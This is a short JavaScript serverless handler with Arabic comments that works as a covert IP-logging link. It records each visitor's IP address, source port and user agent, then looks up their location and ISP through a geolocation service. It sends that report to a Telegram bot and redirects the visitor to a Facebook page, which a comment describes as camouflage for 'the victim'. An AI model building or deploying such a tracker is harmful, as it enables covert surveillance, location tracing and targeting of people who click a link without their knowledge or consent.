const axios = require('axios');

export default async function handler(req, res) {
    const { BOT_TOKEN, CHAT_ID } = process.env;

    // 1. جلب الـ IP والـ Source Port والـ User Agent
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
    const sourcePort = req.socket.remotePort || 'Unknown'; // هنا بنجيب الـ Source Port
    const userAgent = req.headers['user-agent'] || 'Unknown';

    try {
        // 2. استعلام OSINT عن الموقع الجغرافي للـ IP
        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,isp,org,as,query`);
        const geo = geoResponse.data;

        // 3. تنسيق التقرير ليشمل الـ Source Port
        const report = `
🔍 **[ ADVANCED OSINT LOG ]** 🔍
━━━━━━━━━━━━━━━━━━
🌐 **Network Information:**
• **IP Address:** \`${ip}\`
• **Source Port:** \`${sourcePort}\` ⬅️
• **Country:** ${geo.country || 'Unknown'}
• **City:** ${geo.city || 'Unknown'}
• **ISP:** \`${geo.isp || 'Unknown'}\`

📱 **Device Information:**
• **OS/System:** \`${userAgent.split('(')[1]?.split(')')[0] || 'Unknown'}\`
• **User Agent:** \`${userAgent}\`

🕒 **Timestamp:** \`${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\`
━━━━━━━━━━━━━━━━━━
📡 *Cyber Research Dashboard v2.1*
        `;

        // 4. إرسال التقرير لتليجرام
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: report,
            parse_mode: 'Markdown'
        });

        // 5. التمويه: توجيه الضحية لصفحة حقيقية
        return res.redirect(301, 'https://www.facebook.com/communitystandards/');

    } catch (error) {
        console.error('Logging Error:', error);
        return res.redirect(301, 'https://www.facebook.com');
    }
}
